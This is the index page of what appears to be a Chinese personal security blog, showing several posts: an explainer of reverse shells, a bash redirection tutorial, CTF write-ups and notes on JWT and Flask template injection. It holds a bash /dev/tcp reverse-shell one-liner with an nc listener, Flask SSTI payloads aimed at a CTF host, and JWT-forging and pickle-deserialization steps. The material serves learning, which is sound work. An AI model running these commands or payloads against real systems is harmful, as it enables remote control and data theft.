<!DOCTYPE html>


<html lang="en">


<head>
  <meta charset="utf-8" />
    
  <meta name="description" content="Y0un9的博客" />
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <title>
     Y0un9
  </title>
  <meta name="generator" content="hexo-theme-ayer">
  
  <link rel="shortcut icon" href="/favicon.ico" />
  
  
<link rel="stylesheet" href="/dist/main.css">

  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">

  
<link rel="stylesheet" href="/css/custom.css">

  
  
<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>

  
  

  

</head>

</html>

<body>
  
  <div id="app">
    <main class="content on">
      
<section class="cover">
    
      
      <a class="forkMe" href="https://github.com/Shen-Yu/hexo-theme-ayer"
        target="_blank"><img width="149" height="149" src="/images/forkme.png"
          class="attachment-full size-full" alt="Fork me on GitHub" data-recalc-dims="1"></a>
    
  <div class="cover-frame">
    <div class="bg-box">
      <img src="/images/cover1.jpg" alt="image frame" />
    </div>
    <div class="cover-inner text-center text-white">
      <h1><a href="/">Y0un9</a></h1>
      <div id="subtitle-box">
        
        <span id="subtitle"></span>
        
      </div>
      <div>
        
      </div>
    </div>
  </div>
  <div class="cover-learn-more">
    <a href="javascript:void(0)" class="anchor"><i class="ri-arrow-down-line"></i></a>
  </div>
</section>



<script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js"></script>

<div id="main">
  <section class="outer">
  <article class="articles">
    
    
    
    
    <article id="post-shell反弹" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/05/24/shell%E5%8F%8D%E5%BC%B9/"
    >shell反弹</a> 
</h2>
 

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/05/24/shell%E5%8F%8D%E5%BC%B9/" class="article-date">
  <time datetime="2020-05-24T08:39:07.000Z" itemprop="datePublished">2020-05-24</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      
      

      
      <p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。那么什么情况下正向连接不太好用了呢？</p>
<p>1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。</p>
<p>2.它的ip会动态改变，你不能持续控制。</p>
<p>3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p>
<p>4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。</p>
<p>那么反弹就很好理解了， 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p>
<h4 id="现在谈一下shell反弹的方法和原理。"><a href="#现在谈一下shell反弹的方法和原理。" class="headerlink" title="现在谈一下shell反弹的方法和原理。"></a>现在谈一下shell反弹的方法和原理。</h4><ul>
<li><p>通过 <code>nc -lvp port</code> 监听本机的一个端口号</p>
</li>
<li><p>使用 <code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code><br>或<code>bash -i &gt; /dev/tcp/ip/post 0&gt;&amp;1 2&gt;&amp;1</code></p>
</li>
</ul>
<p>反弹shell。这是经典的反弹shell的语句，这里分析一下原理。</p>
<ol>
<li>使用<code>bash -i</code> 启动交互式shell</li>
<li><code>&gt;&amp;</code> 将stdout 1,stderr 2都指向主机的端口</li>
<li><code>0&gt;&amp;1</code> 将stdin 0 指向主机端口。</li>
</ol>
<ul>
<li>这样0,1,2 都指向了主机端口。受害机通过端口读取主机的命令并执行，将执行的结果输出到主机上。就实现了将受害机的shell弹给主机。</li>
</ul>

      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      

    </footer>

  </div>

  

  
  
  

  
  
  

</article>
    
    <article id="post-文件描述符与重定向" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/05/24/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/"
    >文件描述符与重定向</a> 
</h2>
 

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/05/24/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/" class="article-date">
  <time datetime="2020-05-24T07:05:25.000Z" itemprop="datePublished">2020-05-24</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      
      

      
      <h5 id="1-文件描述符"><a href="#1-文件描述符" class="headerlink" title="1. 文件描述符"></a>1. 文件描述符</h5><ul>
<li><p>文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。可以理解为linux跟踪打开文件，而分配的一个数字。(摘自维基百科)</p>
</li>
<li><p>linux启动时有三个标准的文件描述符</p>
<pre><code>标准输入standard input 0 （默认设备键盘）

标准输出standard output 1（默认设备显示器）

错误输出：error output 2（默认设备显示器）</code></pre></li>
<li><p>由于在Linux中一切皆文件，文件所有输入输出都是由该进程所有打开的文件描述符控制的。</p>
</li>
</ul>
<h5 id="2-重定向"><a href="#2-重定向" class="headerlink" title="2. 重定向"></a>2. 重定向</h5><p>由于标准的文件描述符默认取设备(从键盘读取内容，显示器输出内容)。当我们想要将输出的结果保存在某个文件时，就需要对文件描述符进行重定向。换个角度说，<strong><em>重定向就是针对文件描述符的</em></strong></p>
<ul>
<li><p>首先要注意一点是bash在执行一条执行的时候，首先会检查命令中是否存在重定向的符号，如果存在那么首先将文件描述符重定向，然后在把重定向去掉，执行指令。</p>
</li>
<li><p>重定向中含有多个指令时，从左往右依次解析。(不能随意颠倒顺序)</p>
</li>
<li><p><code>&lt;</code> 是对0进行重定向，<code>&gt;</code>对进行重定向</p>
</li>
</ul>
<h6 id="2-1-输入重定向"><a href="#2-1-输入重定向" class="headerlink" title="2.1 输入重定向"></a>2.1 输入重定向</h6><p>格式：[n]&lt; filename </p>
<p>(<code>[n]</code>与<code>&lt;</code>间没有空格。<code>&lt;</code>与filename间有空格)。</p>
<p>举个小栗子。在linux下新建一个文件，文件名为file，在file中写入 <code>hello wrold</code>  。现在使用输入重定向来读取file中的字符。这里把0省略掉用  <code>&lt; file cat</code> 也是一样的</p>
<p><img src="/2020/05/24/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/1.png" alt></p>
<p>解析器首先解析指令中是否含有重定向的符号。解析到<code>&lt;</code>时会先处理重定向，把标准输入指向file。最后的cat就会从标准输入读取内容。即输出<code>hello world</code></p>
<p><img src="/2020/05/24/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/2.png" alt></p>
<h6 id="2-2-输出重定向"><a href="#2-2-输出重定向" class="headerlink" title="2.2 输出重定向"></a>2.2 输出重定向</h6><p>格式：<code>[n]&gt; filename</code> </p>
<p><img src="/2020/05/24/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/3.png" alt></p>
<p>这是首先将标准输出(echo的内容)指向newfile，使用echo输出内容时就会输出到newfile中，不会显示在屏幕上。</p>
<p><img src="/2020/05/24/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/4.png" alt></p>
<h6 id="2-3-标准输出与标准错误输出重定向"><a href="#2-3-标准输出与标准错误输出重定向" class="headerlink" title="2.3 标准输出与标准错误输出重定向"></a>2.3 标准输出与标准错误输出重定向</h6><p>格式：    </p>
<pre><code>&amp;&gt; file 或
&gt;&amp; file</code></pre><p>两者都等价于 <code>&gt; file 2&gt;&amp;1</code></p>
<p>解释一下第二个。这里先将标准输出指向file，再将标准错误输出复制到标准输出。即标准输入和标准错误输出都指向了file</p>
<p><img src="/2020/05/24/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/5.png" alt></p>
<h6 id="2-4-文件描述符的复制。"><a href="#2-4-文件描述符的复制。" class="headerlink" title="2.4 文件描述符的复制。"></a>2.4 文件描述符的复制。</h6><p>格式：<code>[n]&lt;&amp;[m] / [n]&gt;&amp;[m]</code></p>
<p>(这里所有字符间都不要空格)</p>
<p>这里两个都是将文件描述符 n 复制到 m ，两者的区别是，前者是以只读的形式打开，后者是以写的形式打开</p>
<p><strong><em>因此 0&lt;&amp;1 和 0&gt;&amp;1 是完全等价的（读/写方式打开对其没有任何影响）</em></strong></p>
<p><strong><em>&amp; 目的是为了区分数字名字的文件和文件描述符，如果没有&amp; 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符</em></strong></p>
<p>PS:个人觉得这里的复制不是很好理解。我更愿意理解为指向。将n指向m</p>
<p>这里也举个例子。(这个例子比较重要，看懂这个差不多就明白了前面的内容。)这里有两条指令，不过执行的顺序不同</p>
<pre><code>cmd &gt; file 2&gt;&amp;1

cmd 2&gt;&amp;1 &gt;file</code></pre><ul>
<li>先执行第一条命令，这里的 <code>cmd</code> 我们使用 <code>cat flag</code>。此时flag这个文件并不存在，若直接访问会报错。可以看到将标准错误输出写入了file。</li>
</ul>
<p><img src="/2020/05/24/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/6.png" alt></p>
<ul>
<li>现在再用<code>ls</code>代替掉<code>cmd</code>，当使用一个正确的指令时。这里将标准输出也写入了file。</li>
</ul>
<p><img src="/2020/05/24/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/7.png" alt></p>
<p><strong>分析一下原理</strong>：首先将标准输出指向file,再将标准错误输出也指向file。这样正确和错误的信息都会写入file。</p>
<ul>
<li>现在看一下第二条语句，要稍微复杂一些。还是举个例子。这里可以看出和第一条命令的执行结果有写不同，这里是把标准错误输出直接显示在控制台，标准输出写入了file文件。</li>
</ul>
<p><img src="/2020/05/24/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/8.png" alt></p>
<p><strong>也分析一下原理</strong>：</p>
<ul>
<li>当解析到 <code>2&gt;&amp;1</code>时，将标准错误输出指向标准输出。此时</li>
</ul>
<p><img src="/2020/05/24/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/9.png" alt></p>
<ul>
<li>当执行到  <code>&gt;</code>时。将标准输出指向file</li>
</ul>
<p><img src="/2020/05/24/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/10.png" alt></p>
<h6 id="2-5-绑定重定向"><a href="#2-5-绑定重定向" class="headerlink" title="2.5 绑定重定向"></a>2.5 绑定重定向</h6><p>上面的输入输出重定向将输入和输出绑定文件只对当前的那条指令有效，如果需要接下来的指令都支持的话就需要使用 exec 指令</p>
<ul>
<li>格式：<code>exec [n] &lt;/&gt; file/[n]</code></li>
</ul>
<p>以读写方式打开word指代的文件，并将n重定向到该文件。如果n不指定的话，默认为标准输入。</p>
<p><img src="/2020/05/24/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/12.png" alt></p>
<p>逐句分析一下：</p>
<ul>
<li><p><code>exec 4&lt;&gt;file</code> 这里将自定义的文件描述符4指向了file。</p>
</li>
<li><p><code>ls &gt;&amp;4</code> 将ls的结果指向文件描述符4,也就是将标准输出写入到了file中。</p>
</li>
</ul>
<p>PS：大部分内容摘自下面这篇文章，但对其中的指令做了更细节化的解读</p>
<p><a href="https://xz.aliyun.com/t/2548" target="_blank" rel="noopener">参考链接</a></p>

      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      

    </footer>

  </div>

  

  
  
  

  
  
  

</article>
    
    <article id="post-Web2-ikun" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/05/20/Web2-ikun/"
    >[Web2]ikun</a> 
</h2>
 

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/05/20/Web2-ikun/" class="article-date">
  <time datetime="2020-05-20T13:44:12.000Z" itemprop="datePublished">2020-05-20</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      
      

      
      <p>注册登录后，页面是一个购买lv等级的页面。先随便尝试买一个lv。发现均是购买失败。<br><img src="/2020/05/20/Web2-ikun/1.png" alt></p>
<p>这里可以看到提示说一定要买到lv6。随便翻了几页也没有找到lv6。写个脚本。</p>
<p><img src="/2020/05/20/Web2-ikun/2.png" alt>跑出来结果在p181。</p>
<p><img src="/2020/05/20/Web2-ikun/3.png" alt></p>
<p>这里也是一个结算页面。但支付的金额根本不够，抓包。<br><img src="/2020/05/20/Web2-ikun/4.png" alt></p>
<p>这里存在一个薅羊毛漏洞，把discount改为0.00000001。发过去</p>
<p><img src="/2020/05/20/Web2-ikun/5.png" alt></p>
<p>显示只有管理员才能登陆。从之前抓的包可以看到cookie内是存在jwt的。将cookie内的jwt放到<a href="https://jwt.io/" target="_blank" rel="noopener">jwt生成网站</a>。<br><img src="/2020/05/20/Web2-ikun/6.png" alt></p>
<p>usrname正是我们注册的用户名。在kali上破解一下jwt的密钥<br><img src="/2020/05/20/Web2-ikun/7.png" alt></p>
<p>密钥是1Kun</p>
<p><img src="/2020/05/20/Web2-ikun/8.png" alt></p>
<p>把username改为admin，输入密钥，就可以生成对应的jwt。此时cookie内改成我们伪造的jwt。再次发包过去。已经登录进去了。</p>
<p><img src="/2020/05/20/Web2-ikun/9.png" alt></p>
<p>查看源码，这里有一份备份文件。</p>
<p><img src="/2020/05/20/Web2-ikun/10.png" alt></p>
<p>审计一下源码。在Admin.py 有个反序列化点。这里接受become的值并将其反序列化。由于没有对become的值做限制，我们可以自己构造一个类和对象，并在其中执行shell命令。由于<code>__reduce__</code>是在反序列化时自动执行，所以选取它做魔术方法。<br><img src="/2020/05/20/Web2-ikun/11.png" alt></p>
<p>贴上python脚本</p>
<p><img src="/2020/05/20/Web2-ikun/12.png" alt></p>
<p>这里有几个需要注意的点：</p>
<ol>
<li>源码是在python2的环境下执行的，脚本也需要在python2上执行，这里我选的是python2.7。在python3.x上试过会出问题。</li>
<li>payload这个类必须继承object，否则不会拥有<code>__reduce__</code>这个魔术方法。这个还是python2和python3的版本问题。</li>
</ol>
<p><a href="https://blog.csdn.net/qq_27828675/article/details/79358893" target="_blank" rel="noopener">关于Python中object的继承问题</a></p>
<p>执行结果如下，</p>
<p><img src="/2020/05/20/Web2-ikun/13.png" alt></p>
<p>最后点击一键成为大会员。修改数据包。修改become的数据即可得到flag。</p>

      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      

    </footer>

  </div>

  

  
  
  

  
  
  

</article>
    
    <article id="post-python序列化以及对应魔术方法" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/05/16/python%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A5%E5%8F%8A%E5%AF%B9%E5%BA%94%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/"
    >python序列化以及对应魔术方法</a> 
</h2>
 

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/05/16/python%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A5%E5%8F%8A%E5%AF%B9%E5%BA%94%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/" class="article-date">
  <time datetime="2020-05-16T09:10:52.000Z" itemprop="datePublished">2020-05-16</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      
      

      
      <p>ctf中python序列化和反序列的题目还是挺多的，一般在利用反序列化时都会涉及到对应的魔术方法，和php很类似。在这里也做个总结，免得遇到的时候四处查。</p>
<h2 id="pickle模块"><a href="#pickle模块" class="headerlink" title="pickle模块"></a>pickle模块</h2><ol>
<li><p>pickle模块只能在python中使用，且只支持python的基础数据类型</p>
</li>
<li><p>序列化的时候，只是序列化了整个序列对象，而不是内存地址。</p>
</li>
<li><p>序列化：</p>
<ul>
<li><p><code>pickle.dump()</code>方法将obj对象序列化为bytes写入到file文件中</p>
<p><code>pickle.dump(obj, file, protocol=None, *, fix_imports=True)</code></p>
</li>
</ul>
<ul>
<li><p><code>pickle.dumps()</code>方法将obj对象序列化并返回一个bytes对象</p>
<p><code>pickle.dumps(obj, protocol=None, *, fix_imports=True)</code></p>
</li>
</ul>
</li>
<li><p>反序列化：</p>
<ul>
<li><p><code>pickle.load()</code>从一个对象文件中读取序列化数据，将其反序列化之后返回一个对象</p>
<p><code>pickle.load(file, *, fix_imports=True, encoding=&quot;ASCII&quot;, errors=&quot;strict&quot;)</code></p>
</li>
</ul>
<ul>
<li><p><code>pickle.loads()</code>将bytes反序列化并返回一个对象</p>
<p><code>pickle.loads(bytes_object, *, fix_imports=True, encoding=&quot;ASCII&quot;, errors=&quot;strict&quot;)</code></p>
</li>
</ul>
</li>
</ol>
<h2 id="序列化与反序列化中使用的魔术方法"><a href="#序列化与反序列化中使用的魔术方法" class="headerlink" title="序列化与反序列化中使用的魔术方法"></a>序列化与反序列化中使用的魔术方法</h2><p><img src="/2020/05/16/python%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A5%E5%8F%8A%E5%AF%B9%E5%BA%94%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/1.png" alt></p>

      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      

    </footer>

  </div>

  

  
  
  

  
  
  

</article>
    
    <article id="post-JT" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/05/15/JT/"
    >JWT</a> 
</h2>
 

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/05/15/JT/" class="article-date">
  <time datetime="2020-05-15T14:09:52.000Z" itemprop="datePublished">2020-05-15</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      
      

      
      <h3 id="JWT是一种跨域身份验证的解决方案。"><a href="#JWT是一种跨域身份验证的解决方案。" class="headerlink" title="JWT是一种跨域身份验证的解决方案。"></a>JWT是一种跨域身份验证的解决方案。</h3><ol>
<li><p>要说JWT，必须先说一下session。session分为会话session和持久session。</p>
<ul>
<li><p>会话session:只作用于本次会话，此时的session存储在浏览器内存中。当用户关闭浏览器后，此次session会过期。如果用户打开浏览器想继续这次会话的时候,就会因为发送的请求中没有这个sessionid而使服务器无法辨别该把那个session信息给他,注意(这个时候服务器端的sessionid和sessionid所指向的session都还存在,只是没有正确的sessionid和它匹配而占用服务器内存,只有session过期或服务器重启才释放内存</p>
</li>
<li><p>持久session:把cookie固化在用户的计算机上,可以在多次绘画中使用使用。现在的cookie不单单能存放sessionid,还能放用户信息,样式表信息等。持久化session也是实现跨域身份验证的一种解决方案。</p>
</li>
</ul>
</li>
<li><p>现在可以说到JWT了。当用传统的持久session来解决跨域身份验证时，有一个缺点在于此时session都是依赖于持久层的数据库或者问题系统，会有单点风险，如果持久层失败，整个认证体系都会挂掉。而JWT通过客户端保存数据，服务器根本不保存会话数据，每个请求都被发送回服务器。</p>
</li>
<li><p>JWT的原则是在服务器身份验证之后，将生成一个JSON对象并将其发送回用户，之后，当用户与服务器通信时，客户在请求中发回JSON对象。服务器仅依赖于这个JSON对象来标识用户。为了防止用户篡改数据，服务器将在生成对象时添加签名。</p>
</li>
<li><p>JWT分为三个部分。JWT头、有效载荷和签名。JWT将三个部分通过“.”连接在一起形成一个很长的字符串</p>
<ul>
<li><p>JWT头部分是一个描述JWT元数据的JSON对象，如：</p>
<p><code>{</code></p>
<p><code>&quot;alg&quot;: &quot;HS256&quot;,</code></p>
<p> <code>&quot;typ&quot;: &quot;JWT&quot;  }</code></p>
</li>
<li><p>有效载荷，有效载荷部分，是JWT的主体内容部分，也是一个JSON对象，包含需要传递的数据。 JWT指定七个默认字段供选择。</p>
<p>iss：发行人</p>
<p>exp：到期时间</p>
<p>sub：主题</p>
<p>aud：用户</p>
<p>nbf：在此之前不可用</p>
<p>iat：发布时间</p>
<p>jti：JWT ID用于标识该JWT</p>
<p>除以上默认字段外，我们还可以自定义私有字段，如下例：</p>
<p><code>{</code></p>
<p>  <code>&quot;sub&quot;: &quot;1234567890&quot;,</code></p>
<p> <code>&quot;name&quot;: &quot;chongchong&quot;,</code></p>
<p>  <code>&quot;admin&quot;: true</code></p>
<p> <code>}</code></p>
</li>
</ul>
<ul>
<li>签名哈希部分是对上面两部分数据签名，通过指定的算法生成哈希，以确保数据不会被篡改。</li>
</ul>
</li>
<li><p>JWT的使用</p>
<p> 客户端接收服务器返回的JWT，将其存储在Cookie或localStorage中。<br>此后，客户端将在与服务器交互中都会带JWT。如果将它存储在Cookie中，就可以自动发送，但是不会跨域，因此一般是将它放入HTTP请求的Header Authorization字段中。</p>
<p> Authorization: Bearer</p>
<p> 当跨域时，也可以将JWT被放置于POST请求的数据主体中。</p>
</li>
<li><p>注意事项</p>
<ul>
<li><p>JWT默认不加密，但可以加密。生成原始令牌后，可以使用改令牌再次对其进行加密。</p>
</li>
<li><p>当JWT未加密方法时，一些私密数据无法通过JWT传输。</p>
</li>
<li><p>JWT不仅可用于认证，还可用于信息交换。善用JWT有助于减少服务器请求数据库的次数。</p>
</li>
<li><p>JWT的最大缺点是服务器不保存会话状态，所以在使用期间不可能取消令牌或更改令牌的权限。也就是说，一旦JWT签发，在有效期内将会一直有效。</p>
</li>
<li><p>JWT本身包含认证信息，因此一旦信息泄露，任何人都可以获得令牌的所有权限。为了减少盗用，JWT的有效期不宜设置太长。对于某些重要操作，用户在使用时应该每次都进行进行身份验证。</p>
</li>
<li><p>为了减少盗用和窃取，JWT不建议使用HTTP协议来传输代码，而是使用加密的HTTPS协议进行传输。</p>
</li>
</ul>
</li>
</ol>
<p>PS：JWT是可破解和伪造的。在这里附上JWT破解工具和生成链接</p>
<p><a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">破解工具</a> </p>
<p><a href="https://jwt.io/" target="_blank" rel="noopener">生成网站</a></p>
<p><a href="https://www.cnblogs.com/zhangxp1129/archive/2012/08/20/2647767.html" target="_blank" rel="noopener">参考链接</a></p>
<p><a href="https://baijiahao.baidu.com/s?id=1608021814182894637&wfr=spider&for=pc" target="_blank" rel="noopener">参考链接</a></p>

      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      

    </footer>

  </div>

  

  
  
  

  
  
  

</article>
    
    <article id="post-WesternCTF2018-shrine" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/05/15/WesternCTF2018-shrine/"
    >[WesternCTF2018]shrine</a> 
</h2>
 

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/05/15/WesternCTF2018-shrine/" class="article-date">
  <time datetime="2020-05-15T02:33:00.000Z" itemprop="datePublished">2020-05-15</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      
      

      
      <p>打开界面出现源码，是一个flask的框架。审计一下</p>
<p><img src="/2020/05/15/WesternCTF2018-shrine/1.png" alt></p>
<p>1.设置app的配置文件为flag同时删除环境变量中的flag。那么就是要想办法从配置文件中获取flag了。</p>
<p>2.<img src="/2020/05/15/WesternCTF2018-shrine/2.png" alt></p>
<p>这里过滤掉了<code>()</code>以及config、self。那么就不能直接通过<code></code>或<code></code>来获取配置文件了<br>。<code>self.__dict__</code>内存储着类的静态函数、类函数、普通函数、全局变量以及一些内置的属性。也不能使用<code>__subclasses__()</code>来执行shell命令</p>
<p>最后<code>return flask.render_template_string(safe_jinja(shrine))</code>语句可以确认存在着注入点。先测试一下</p>
<p><code>http://e91f3d14-bdaa-4601-86c4-ebe6cc5d478e.node3.buuoj.cn/shrine/%7B%7B2*2%7D%7D</code></p>
<p><img src="/2020/05/15/WesternCTF2018-shrine/3.png" alt></p>
<p>3.这里可以用<code>get_flashed_messages(), url_for()</code>来读取配置文件</p>
<p><code>url_for()</code></p>
<p>一般我们通过一个URL就可以执行到某一个函数。如果反过来，我们知道一个函数，怎么去获得这个URL呢？url_for函数就可以帮我们实现这个功能。url_for()函数接收两个及以上的参数，他接收函数名作为第一个参数，接收对应URL规则的命名参数，如果还出现其他的参数，则会添加到URL的后面作为查询参数。</p>
<p><code>get_flashed_messages()</code></p>
<p>返回之前在Flask中通过 flash() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用get_flashed_messages() 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)。</p>
<p>个人理解这两个函数都用于flask，他的全局属性中也就会存储flask当前对象的许多信息，包括配置信息。</p>
<p>3.这里试例url_for()。payload:</p>
<p><code>http://e91f3d14-bdaa-4601-86c4-ebe6cc5d478e.node3.buuoj.cn/shrine/%7B%7Burl_for.__globals__%7D%7D</code></p>
<p><img src="/2020/05/15/WesternCTF2018-shrine/4.png" alt></p>
<p>这里找到了current_app。也就是当前的app对象的信息。再找到app的配置信息payload:</p>
<p><code>http://e91f3d14-bdaa-4601-86c4-ebe6cc5d478e.node3.buuoj.cn/shrine/%7B%7Burl_for.__globals__[&#39;current_app&#39;].config%7D%7D</code></p>
<p><img src="/2020/05/15/WesternCTF2018-shrine/5.png" alt></p>
<p>找到了flag。当然用<code>http://e91f3d14-bdaa-4601-86c4-ebe6cc5d478e.node3.buuoj.cn/shrine/%7B%7Burl_for.__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;]%7D%7D</code>也是一样的。</p>

      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>


    </footer>

  </div>

  

  
  
  

  
  
  

</article>
    
    <article id="post-flask-模板注入" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/05/13/flask-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"
    >flask 模板注入</a> 
</h2>
 

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/05/13/flask-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" class="article-date">
  <time datetime="2020-05-13T12:09:53.000Z" itemprop="datePublished">2020-05-13</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      
      

      
      <h5 id="之前对于flask模板注入只看了下大概的原理。在buu又遇到了这个题。在这里做一个总结"><a href="#之前对于flask模板注入只看了下大概的原理。在buu又遇到了这个题。在这里做一个总结" class="headerlink" title="之前对于flask模板注入只看了下大概的原理。在buu又遇到了这个题。在这里做一个总结"></a>之前对于flask模板注入只看了下大概的原理。在buu又遇到了这个题。在这里做一个总结</h5><p>这位师傅总结得很好，我就再自己实操一遍，加深理解。<br><a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">参考链接</a></p>
<p>模板注入简单来说就是由于代码不规范或信任了用户输入而导致了服务端模板注入&#40;和sql注入很相似&#41;</p>
<p>flask中模板注入最主要的还是使用了render_template_string&#40;template&#41;渲染字符串。如果在模板中有”%&#40;request.url&#41;”这样的语句。&#40;template&#41;就会将&#123;&#123;&#125;&#125;中的语句一起解析，造成注入。而使用render_template&#40;&#41;就可以避免这种情况。原因在于使用render_template&#40;&#41;时，模板已经提前渲染好了，用户恶意传入的&#123;&#123;&#125;&#125;的语句并不会再次解析。</p>
<p><strong>接下来是利用的方法</strong></p>
<p>在python中，object类是Python中所有类的基类，如果定义一个类时没有指定继承哪个类，则默认继承object类。例如我们打印一下””的基类</p>
<p>1.<code>__class__</code>  可以得到一个对象的类型</p>
<p><code>print(&quot;&quot;.__class__)</code><br>得到结果：<code>&lt;class &#39;str&#39;&gt;</code></p>
<p>2.<code>__bases__</code>得到一个对象的基类</p>
<p><code>print(&quot;&quot;.__class__.__bases__)</code> 得到结果：<code>&lt;class &#39;object&#39;&gt;</code></p>
<p>3.<code>__mro__</code> 列出解析方法调用的顺序</p>
